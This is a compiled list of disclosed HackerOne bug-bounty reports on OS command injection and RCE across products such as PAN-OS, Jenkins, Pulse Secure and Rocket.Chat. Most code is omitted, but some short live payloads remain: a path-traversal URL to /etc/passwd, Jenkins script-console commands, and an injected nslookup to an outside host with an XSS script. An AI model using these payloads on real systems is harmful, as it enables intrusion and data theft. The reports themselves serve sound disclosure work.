# HackerOne 实战案例：os-command-injection

_34 份已披露报告（High/Critical 优先），来源 HackerOne 公开披露_

## GlobalProtect - OS Command Injection #█████████
- 等级：Critical | 项目：U.S. | 披露：2026-01-12 | CVE：CVE-2024-3400
- 原文：https://hackerone.com/reports/2468496

- - - - - - - - 
**Description:**
A command injection vulnerability in the GlobalProtect feature of Palo Alto Networks PAN-OS software for specific PAN-OS versions and distinct feature configurations may enable an unauthenticated attacker to execute arbitrary code with root privileges on the firewall.Cloud NGFW, Panorama appliances, and Prisma Access are not impacted by this vulnerability.
## References
    - https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-CVE-2024-3400/
    - https://attackerkb.com/topics/SSTk336Tmf/cve-2024-3400/rapid7-analysis
    - https://nvd.nist.gov/vuln/detail/CVE-2024-3400
## Impact
GlobalProtect - OS Command Injection
## System Host(s)
███


## Unauthenticated Path Traversal and Command Injection in Trellix Enterprise Security Manager 11.6.10
- 等级：Critical | 项目：Trellix | 披露：2025-01-12 | CVE：-
- 原文：https://hackerone.com/reports/2817658

- - - - - - - - 
**Product:** Trellix Enterprise Security Manager (ESM)
**Version Tested:** 11.6.10
**Source:** Publicly available trial version from [Trellix Trials](https://www.trellix.com/downloads/trials/?selectedTab=siem) — "Trellix Enterprise Security Manager, Event Receiver & Log Manager VM for SIEM v11.6.10."
**Potentially Affected Versions:** Latest version could also be vulnerable
**Vulnerability Type:** Path Traversal, Command Injection
---
## Summary:
A critical vulnerability in Trellix Enterprise Security Manager (ESM) version 11.6.10 allows **unauthenticated** access to the internal `Snowservice` API and enables remote code execution through command injection, executed as the r


## CVE-2020-7961 RCE Liferay Portal Unauthenticated via https://████████/
- 等级：Critical | 项目：U.S. | 披露：2024-10-25 | CVE：CVE-2020-7961
- 原文：https://hackerone.com/reports/2742457

- - - - - - - - 
poc: 
[code omitted]
Attacker can read response from system for command systeminfo 
[code omitted]
█████
## Impact
Attacker can execute commands on server
## System Host(s)
█████
## Affected Product(s) and Version(s)
## CVE Numbers
CVE-2020-7961
## Steps to Reproduce
I write steps in Description
## Suggested Mitigation/Remediation Actions
---


## Remote code injection in Log4j on  https://mymtn.mtncongo.net - CVE-2021-44228
- 等级：Critical | 项目：MTN | 披露：2024-08-24 | CVE：CVE-2021-44228
- 原文：https://hackerone.com/reports/1425565

- - - - - - - - 
###Summary
Hello,
I would to like report this security flaw on https://mymtn.mtncongo.net. Using script nuclei i can found CVE-2021-44228. This is a critical issue cause as remote command execution. On my test i just retrive hostname of machine via nuclei script. (https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-44228.yaml)
###Steps To Reproduce
How we can reproduce the issue;
1. run nuclei script via cmd; ./nuclei -u https://mymtn.mtncongo.net:8443  -t ../nuclei-templates/cves/2021/CVE-2021-44228.yaml
It will retrive the hostname of machine on output " [net]"
Like this;
[code omitted]`
###Mitigation
Update according the vendor and thecnica


## Remote code injection in Log4j on http://mtn1app.mtncameroon.net  - CVE-2021-44228
- 等级：Critical | 项目：MTN | 披露：2024-08-24 | CVE：CVE-2021-44228
- 原文：https://hackerone.com/reports/1425563

- - - - - - - - 
###Summary
Hello,
I would to like report this security flaw on http://mtn1app.mtncameroon.net . Using script nuclei i can found CVE-2021-44228. This is a critical issue cause as remote command execution. On my test i just retrive hostname of machine via nuclei script. (https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-44228.yaml)
###Steps To Reproduce
How we can reproduce the issue;
1. run nuclei script via cmd; ./nuclei -u http://mtn1app.mtncameroon.net:8080/ -t ../nuclei-templates/cves/2021/CVE-2021-44228.yaml
It will retrive the hostname of machine on output " lastic-co1-nodes1.mtnnigeria.net"
Like this;
[code omitted]`
This vulnerability


## Shell command injection in https://partner.steamgames.com/admin/game/publish/ via screenshot URL
- 等级：Critical | 项目：Valve | 披露：2024-07-30 | CVE：-
- 原文：https://hackerone.com/reports/949361

- - - - - - - - 
Insufficient validation of parameters allowed injecting shell metacharacters into values used to construct a Bash command.
**Summary (researcher):**
.
---


## Shell command injection in https://partner.steamgames.com/bundles/savestore/ via overwriting asset_path_identifier
- 等级：Critical | 项目：Valve | 披露：2024-07-30 | CVE：-
- 原文：https://hackerone.com/reports/926169

- - - - - - - - 
Insufficient validation of parameters allowed injecting shell metacharacters into values used to construct a Bash command.
**Summary (researcher):**
.
---


## RCE via github import
- 等级：Critical | 项目：GitLab | 披露：2022-11-16 | CVE：-
- 原文：https://hackerone.com/reports/1672388

- - - - - - - - 
Hello,
While continuing mining on [github import](https://hackerone.com/reports/1665658), I found a vulnerability on gitlab.com allowing to execute remotely arbitrary commands.
Gitlab uses Octokit to get data from github.com. Octokit uses [Sawyer::Resource](https://github.com/lostisland/sawyer/blob/master/lib/sawyer/resource.rb) to represent results.
Sawyer is a crazy class that [converts](https://github.com/lostisland/sawyer/blob/f5f080d5c5260e094069139ffc7c13d0acba4ab5/lib/sawyer/resource.rb#L81) a hash to an object whose methods are based on the hash's key:
[code omitted]
Gitlab uses directly the responded Sawyer object in few functions, such as, the `id` variable in [thi


## Insecure use of shell.openExternal() in Rocket.Chat Desktop App leading to RCE
- 等级：Critical | 项目：Rocket.Chat | 披露：2022-08-01 | CVE：-
- 原文：https://hackerone.com/reports/924151

- - - - - - - - 
**Summary:** The Rocket.Chat Desktop app passes the links users click on to Electron's `shell.openExternal()` function which can lead to remote code execution.
**Description:** The filtering on the URLs passed to `shell.openExternal()` is insufficient. An attacker can craft and send a link that when clicked will cause malicious code from a remote origin to be executed on the user's system. The specific attack presented here has been tested with Xubuntu 20.04, however similar attacks are also possible on other systems, including non-Linux operating systems.
## Releases Affected:
  * Tested with latest release 2.17.10 from https://github.com/RocketChat/Rocket.Chat.Electron/rel


## Blind User-Agent SQL Injection to Blind Remote OS Command Execution at █████████
- 等级：Critical | 项目：Sony | 披露：2022-07-06 | CVE：-
- 原文：https://hackerone.com/reports/1339430

- - - - - - - - 
The researcher reported that a login form of a Sony website was vulnerable to a blind SQL injection. The researcher was able to use the blind SQL injection to enable xp_cmdshell functionality on the database and then run system commands. The output from the system commands was then obtained via DNS-based exfiltration.
**Summary (researcher):**
https://infosecwriteups.com/how-i-escalated-a-time-based-sql-injection-to-rce-bbf0d68cb398
---


## Exposed Kubernetes API - RCE/Exposed Creds
- 等级：Critical | 项目：Snapchat | 披露：2021-07-29 | CVE：-
- 原文：https://hackerone.com/reports/455645

- - - - - - - - 
@txt3rob found one of Snaps internal Kubernetes instances exposing an API endpoint without authorization to the public. With access to this API he was able to run arbitrary code/jobs as a cluster-admin and gained access to credentials with internal access to a significant number of instances.
**Summary (researcher):**
During a worldwide kubernetes scan with binaryedge.io i found a K8 exposed internal API endpoint without authorization to the public. 
With access to this API I was able to run arbitrary code/jobs as a cluster-admin and gained access to credentials with internal access to a significant number of instances.
---


## Unauth RCE on Jenkins Instance at https://█████████/
- 等级：Critical | 项目：U.S. | 披露：2021-03-24 | CVE：-
- 原文：https://hackerone.com/reports/1125329

- - - - - - - - 
**Description:**
Hi Team,
While Doing Recon on U.s Government Sites, I Found below asset Belongs to U.S Government (Please Check its SSL certificate to confirm or Please check attached  POC Video)
 █████████
https://███/
Attacker can execute Command Injection without Authentication.
## Impact
Unauth RCE
## System Host(s)
███
## Affected Product(s) and Version(s)
## CVE Numbers
## Steps to Reproduce
1. Navigate to https://███████/_script
2. Please execute below commands to confirm Unauth RCE.
             Commands:  println "ls".execute().text
                                         println "whoami".execute().text
#POC
Please check Attached POC Video to follow steps (If Requ


## XSS leads to RCE on the RocketChat desktop client.
- 等级：Critical | 项目：Rocket.Chat | 披露：2021-01-01 | CVE：-
- 原文：https://hackerone.com/reports/899964

- - - - - - - - 
**Summary:** It is possible to call `electron.shell.openExternal` from javascript inside a server webview.
**Description:** The document `onclick` handler allows executing `electron.shell.openExternal` by crafting an attacker-controlled link and dispatching a `click` event on it after overwriting `Regex.test`.
## Releases Affected:
  * Rocket.Chat Desktop Client up to version 2.17.9
## Steps To Reproduce (from initial installation to vulnerability):
  1. Have a XSS vulnerability such as #894462 or #899954.
  2. Call the following payload (for macos, adjust for other OSes as required):
[code omitted]
  3. Browse to a page with the XSS payload.
  4. Use your freshly opened cal


## Remote Code Execution in ██████
- 等级：Critical | 项目：U.S. | 披露：2020-05-11 | CVE：-
- 原文：https://hackerone.com/reports/710864

- - - - - - - - 
The vulnerability you reported has been resolved and this report is now closed. If you have any further questions or disagree that the report is resolved, please let us know.
Thank you for your time and effort to improve the security of the DoD information network.
Thanks @s3cr3tsdn for reporting RCE in a DoD website.  Issue has been resolved and report placed into a disclosed summary status as you requested.
----------------------------
Hi @everyone,
i'm going to make a detailed writeup for this report disclosing a new tool for mass exploitation of these bugs starting from one google dork,
you will find it on @sud0root medium blog,
Best Wishes and happy hunting,
@S3cr3tSDN.


## Store Development Resource Center was vulnerable to a Remote Code Execution - Unauthenticated Remote Command Injection (CVE-2019-0604)
- 等级：Critical | 项目：Starbucks | 披露：2019-12-12 | CVE：CVE-2019-0604
- 原文：https://hackerone.com/reports/536134

- - - - - - - - 
l00ph0le discovered an endpoint on the Store Development Resource Center site at https://sdrc.starbucks.com/_layouts/15/picker.aspx was vulnerable to a deserialization RCE in Microsoft Sharepoint per CVE-2019-0604.
@l00ph0le — thank you for reporting this vulnerability, your patience while we applied the patch and for confirming the resolution.
---


## Arbitrary File Reading leads to RCE in the Pulse Secure SSL VPN on the https://███
- 等级：Critical | 项目：U.S. | 披露：2019-12-02 | CVE：CVE-2019-11510,
- 原文：https://hackerone.com/reports/678496

- - - - - - - - 
##Description
Hello. Some time ago, researcher Orange Tsai from DEVCORE team had a talk on Defcon/BlackHat regarding Pulse Secure SSL VPN vulnerabilities fixed on 2019/4/25:
**CVE-2019-11510 - Pre-auth Arbitrary File Reading**
CVE-2019-11542 - Post-auth Stack Buffer Overflow
**CVE-2019-11539 - Post-auth Command Injection**
CVE-2019-11538 - Post-auth Arbitrary File Reading
**CVE-2019-11508 - Post-auth Arbitrary File Writing**
CVE-2019-11540 - Post-auth Session Hijacking
Link to the slides: https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf
I discovered that https://████ instance is vulnerable to described vulnerabilities.
##POC
Ext


## Pulse Secure File disclosure, clear text and potential RCE
- 等级：Critical | 项目：U.S. | 披露：2019-12-02 | CVE：CVE-2019-11510
- 原文：https://hackerone.com/reports/671749

- - - - - - - - 
**Summary:**
Pulse Secure has two main vulnerabilities that allow file disclosure and post auth RCE
**Description:**
CVE-2019-11510  is a file disclosure due to some normalization issues in pulse secure. I was able to reproduce this by  grabbing in the etc/passswd. 
https://$hax/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/#
Though the impact of that is very limited, medium to high sec at best. From here we can grab a specific file.
The file /data/runtime/mtmp/lmdb/dataa/data.mdb contains clear context passwords and usernames, when a user logs in from here we can then access the Pulse secure instance. I stopped here due to not want


## Webshell via File Upload on ecjobs.starbucks.com.cn
- 等级：Critical | 项目：Starbucks | 披露：2019-11-13 | CVE：-
- 原文：https://hackerone.com/reports/506646

- - - - - - - - 
**Summary:** 
OS Command Injection which can let the attacker who get more important information of the server,such as disclosures internal source code of the webapp,database data and invade the internal network.
**Description:** 
I found that users can upload asp/aspx and other dynamic files via the avatar upload function when adding a space character behind the file type to bypass the upload file limit.The attacker can run malicious cmd on the server.
## Steps To Reproduce:
  1. Sign in the url(https://ecjobs.starbucks.com.cn) and direct to the resume endpoint.
  2. Use burp suite tools to interupt the avatar upload request.
  3. Replace the filename type [code omitted] to


## gitlabhook OS Command Injection
- 等级：Critical | 项目：Node.js | 披露：2019-09-13 | CVE：CVE-2019-5485
- 原文：https://hackerone.com/reports/685447

- - - - - - - - 
I would like to report OS Command Injection in gitlabhook.
It allows execution of arbitrary code on the remote server, that waits for instructions from gitlab.
# Module
**module name:** gitlabhook 
**version:** 0.0.17
**npm page:** `https://www.npmjs.com/package/gitlabhook`
## Module Description
This is an easy to use nodeJS based web hook for GitLab.
## Module Stats
[5] downloads in the last week
# Vulnerability
## Vulnerability Description
Function "ExecFile" at line 146 executes commands without any sanitization. User input gets passed directly to this command. 
## Steps To Reproduce:
An exploit on python3 was created. 
[code omitted]
Please follow these steps:
1.   Creat


## OS Command Injection in Nexus Repository Manager 2.x
- 等级：Critical | 项目：Central | 披露：2019-08-20 | CVE：CVE-2019-5475
- 原文：https://hackerone.com/reports/654888

- - - - - - - - 
# Maven artifact
**groupId:** org.sonatype.nexus.plugins
**artifactId:** nexus-yum-repository-plugin
**version:** 2.14.9-01
# Vulnerability
## Vulnerability Description
The Nexus Yum Repository Plugin is vulnerable to Remote Code Execution. All instances using CommandLineExecutor.java with user-supplied data is vulnerable, such as the Yum Configuration Capability. 
## Additional Details
**Source File and Line Number:** https://github.com/sonatype/nexus-public/blob/release-2.14.9-01/plugins/yum/nexus-yum-repository-plugin/src/main/java/org/sonatype/nexus/yum/internal/capabilities/YumCapability.java#L121
## Steps To Reproduce:
1. Navigate to "Capabilities" in Nexus Repository 


## Potential pre-auth RCE on Twitter VPN
- 等级：Critical | 项目：X | 披露：2019-08-10 | CVE：CVE-2019-11510,
- 原文：https://hackerone.com/reports/591295

- - - - - - - - 
Hi, we(Orange Tsai and Meh Chang) are the security research team from DEVCORE. Recently, we are doing a research about SSL VPN security, and found several critical vulnerabilities on Pulse Secure SSL VPN! We have reported to vendor and [patches](https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101) have been released on `2019/4/25`. Since that, we keep monitoring numerous large corporations using Pulse Secure and we noticed that Twitter haven't patched the SSL VPN server over one month!
These vulnerabilities include a pre-auth file reading(CVSS 10) and a post-auth(admin) command injection(CVSS 8.0) which can be chained into a pre-auth RCE! Here are all vulne


## Jenkins Unauthenticated RCE on https://djangoci.com/
- 等级：Critical | 项目：Django | 披露：2019-05-16 | CVE：CVE-2018-1000861,
- 原文：https://hackerone.com/reports/579760

- - - - - - - - 
This report discloses an RCE issue on djangoci.com as outlined in https://www.djangoproject.com/weblog/2019/may/15/rce-djangoci/
While technically a valid issue, it is out of scope for bounty, please see https://hackerone.com/django for details on which issues qualify for bounties.
---


## Remote Command Execution in a internal server to get the flag file
- 等级：Critical | 项目：h1-5411-CTF | 披露：2018-10-22 | CVE：-
- 原文：https://hackerone.com/reports/415682

- - - - - - - - 
**Summary:**
After source code disclosure using a LFI vulnerability and using PHP object injection with XXE I was able to find an internal service at port 1337. Using the SSRF through XXE I sent a HTTP request to this internal service and discovered a python object injection using status parameter, with this vector I was able to get RCE on the server located at 104.248.121.85.
**Description:**
_LFI_
The *template* parameter at /api/generate.php is vulnerable to LFI. So I could get all relevant source code from the application using *type* as text. I created a python script to help:
[code omitted]
Using Burp:
{F352386}
Some files read during my tests:
1. /etc/passwd
2. /etc/i


## OS Command Injection in scripts/firefox-db2pem.sh via untrusted certificate nicknames
- 等级：High | 项目：curl | 披露：2025-06-28 | CVE：-
- 原文：https://hackerone.com/reports/3225565

- - - - - - - - 
On AI usage: Only for grammar/formatting suggestions/POC code troubleshooting; all vulnerability discovery, POC code creation, and analysis were done manually.
Hey folks, I noticed something I think is worth bringing to you--
scripts/firefox-db2pem.sh helper in the curl source uses
`eval certutil -d "$db" -L -n "$nickname" -a`
to extract each certificate by nickname. Because eval re-parses its arguments, a malicious nickname containing shell syntax (e.g. $(whoami > pwned)) is executed on the host.
Affected Version
-curl master as of June 26 2025 (commit 2a9dfe2), not sure how long this vuln has been in for though.
Steps To Reproduce
1. Install prerequisites
`sudo apt-get ins


## DNS rebinding in --inspect (again) via invalid IP addresses
- 等级：High | 项目：Node.js | 披露：2023-08-11 | CVE：CVE-2022-32212
- 原文：https://hackerone.com/reports/1574078

- - - - - - - - 
The IsAllowedHost check in https://github.com/nodejs/node/blob/fdf0a84e826d3a9ec0ce6f5a3f5adc967fe99408/src/inspector_socket.cc#L580 can easily be bypassed because IsIPAddress does not properly check if an IP address is invalid or not. When an invalid IPv4 address is provided (for instance 10.0.2.555 is provided), the browser will make a DNS requests to the DNS server, providing a vector for an attacker-controlled DNS server to perform a rebinding attack and hence access the JSON file containing the WebSocket file.
## Steps To Reproduce:
The steps to reproduce is mostly the same as https://hackerone.com/reports/1069487, but replace localhost6 with 10.0.2.555, I am copying it


## Jitsi Desktop Client RCE By Interacting with Malicious URL Schemes on Windows
- 等级：High | 项目：8x8 | 披露：2023-02-10 | CVE：CVE-2022-43550
- 原文：https://hackerone.com/reports/1692603

- - - - - - - - 
A command injection vulnerability exists in Jitsi before commit [8aa7be58522f4264078d54752aae5483bfd854b2]( https://github.com/jitsi/jitsi/commit/8aa7be58522f4264078d54752aae5483bfd854b2) when launching browsers on Windows which could allow an attacker to insert an arbitrary URL which opens up the opportunity to remote execution.
We thank @ex0dus-0x  for submitting this report to us.
Ref: CVE-2022-43550
---


## Insecure use of shell.openExternal() leads to RCE in Rocket.Chat-Desktop
- 等级：High | 项目：Rocket.Chat | 披露：2022-12-08 | CVE：CVE-2022-44567
- 原文：https://hackerone.com/reports/1781102

- - - - - - - - 
Rocket.Chat-Desktop passes the parameter url of openInternalVideoChatWindow to shell.openExternal(), which may lead to remote code execution (internalVideoChatWindow.ts#L17). To exploit the vulnerability, the internal video chat window must be disabled or a Mac App Store build must be used (internalVideoChatWindow.ts#L14). The vulnerability may be exploited by an XSS attack because the function openInternalVideoChatWindow is exposed in the Rocket.Chat-Desktop-API.
---


## Reflected XSS and Blind out of band command injection at subdomain dstuid-ww.dst.ibm.com
- 等级：High | 项目：IBM | 披露：2022-02-04 | CVE：-
- 原文：https://hackerone.com/reports/410334

- - - - - - - - 
I found an XSS and Blind OS based injection issue due to the incorrect handling of the  characters in THE EMAIL  get& post parameters.  A <script> injected and a sleep command succesfully executed, the following link works as a PoC that alerts the string in the script:
I reproduced the same on Firefox and IE and Microsoft Edge
XSS POC URL:-
GET /cgi-bin/PasswordCreate.pl?email=%26nslookup%20%22dqzr3elx6wgztgtzd3if-0oyyf_qzd2wodwlaljh%22%2286m.r87.me%22cier4%3cscript%3ealert(1)%3c%2fscript%3emikflzhwaep&ibm-submit=Submit HTTP/1.1
Host: dstuid-ww.dst.ibm.com
https://dstuid-ww.dst.ibm.com/cgi-bin/PasswordCreate.pl?email=%26nslookup%20%22dqzr3elx6wgztgtzd3if-0oyyf_qzd2wodwlaljh%


## GitLab-Runner on Windows `DOCKER_AUTH_CONFIG` container host Command Injection
- 等级：High | 项目：GitLab | 披露：2020-11-04 | CVE：-
- 原文：https://hackerone.com/reports/955016

- - - - - - - - 
## Summary
GitLab-Runner, when running on Windows with a `docker` executor, is vulnerable to Command Injection via the `DOCKER_AUTH_CONFIG` build variable. Injected commands are executed on the container host, not within a Docker container, as such could compromise all future builds which are executed by the runner.
## Details
When using a `docker` executor, the `DOCKER_AUTH_CONFIG` build variable is processed as a JSON docker config file. One of the possible config values, `credHelpers`, specifies a hash of repository keys to docker Credential Helper application values. 
[code omitted]
When `gitlab-runner` attempts to create an image, each key value pair in the `credHelpers


## Remote Code Execution through DNN Cookie Deserialization
- 等级：High | 项目：U.S. | 披露：2020-05-27 | CVE：-
- 原文：https://hackerone.com/reports/876708

- - - - - - - - 
**Summary:**
The application at [code omitted] presents a deserialization vulnerability that permits RCE and file read/write
## Step-by-step Reproduction Instructions
1. Navigate to a random page that must return a 404 Error status like [code omitted]
2. Add this cookie in the request header: [code omitted]
3. Insert the payload into the [code omitted] cookie. You can generate a payload with the following tool https://github.com/pwntester/ysoserial.net, using the DotNetNuke plugin, or use the official exploit from here: https://www.exploit-db.com/exploits/48336, or use the following payload to read a file from the system:
[code omitted]
Where [code omitted] is the wanted fil


## Remote Code Execution - Unauthenticated Remote Command Injection (via Microsoft SharePoint CVE-2019-0604)
- 等级：High | 项目：U.S. | 披露：2020-05-11 | CVE：CVE-2019-0604
- 原文：https://hackerone.com/reports/534630

- - - - - - - - 
**Summary:**
Microsoft recently released a patch for CVE-2019-0604. This vulnerability is caused by the Microsoft SharePoint application deserializing untrusted data from a user.
This means an attacker can send a specially crafted/encoded parameter to a Microsoft SharePoint URL, and it will allow Remote Code Execution or Command Injection on the server.
This is an in-depth blog post about the vulnerability.
https://www.thezdi.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability
The ████ SharePoint site suffers from this vulnerability. The URL for the main site is: https://████/███████/OrgStruct/StandingGroups/Pages/default.aspx 
**Description:


## Remote Code Execution via Extract App Plugin
- 等级：High | 项目：Nextcloud | 披露：2019-05-30 | CVE：CVE-2019-5441
- 原文：https://hackerone.com/reports/546753

- - - - - - - - 
Hi, I found a critical issue in the Add-on "Extract" listed in the Nextcloud Marketplace: https://apps.nextcloud.com/apps/extract (This extension can be installed directly from Nextcloud Application)
The vulnerability was found in file: extract/lib/Controller/ExtractionController.php line 102.
The affected code can be seen below:
[code omitted]
The unrar line allows Command Injection via $file and $dir parameters, an attacker could use the following payload in order to exploit a Remote Command Execution in a Nextcloud Server and exfiltrate data via Curl requests.
[code omitted]
Abusing this issue I was able to take full control of the demo instance: https://demo.nextcloud.co


## Authenticated RCE in ToughSwitch
- 等级：High | 项目：Ubiquiti | 披露：2018-06-19 | CVE：-
- 原文：https://hackerone.com/reports/273449

- - - - - - - - 
In ToughSwitch v1.3.5 and prior, due to lack of validation is possible to execute an CSRF. If an authenticated user access an attacker controlled web page, it could trigger the CSRF and the resulting request could trigger an RCE.
**Summary (researcher):**
An RCE vulnerability existed in the ToughSwitch that could be triggered through CSRF.
---


## RCE via ssh:// URIs in multiple VCS
- 等级：High | 项目：Internet | 披露：2017-09-21 | CVE：CVE-2017-9800,
- 原文：https://hackerone.com/reports/260005

- - - - - - - - 
I'd like to submit an RCE issue within Git SVN and Mercurial, the CVEs are:
*  CVE-2017-9800 (Subversion)
* CVE-2017-1000116 (Mercurial (hg))
* CVE-2017-1000117 (Git)
Further Info can be found at:
http://blog.recurity-labs.com/2017-08-10/scm-vulns
And product specific:
* https://public-inbox.org/git/xmqqh8xf482j.fsf@gitster.mtv.corp.google.com/T/#u
* http://subversion.apache.org/security/CVE-2017-9800-advisory.txt
* https://about.gitlab.com/2017/08/10/gitlab-9-dot-4-dot-4-released/
I think these issues which all are based on the same flaw could be worth
an IBB Bounty. However I'd like to point out that we at Recurity Labs
would like the bounty being donated to a charity. The

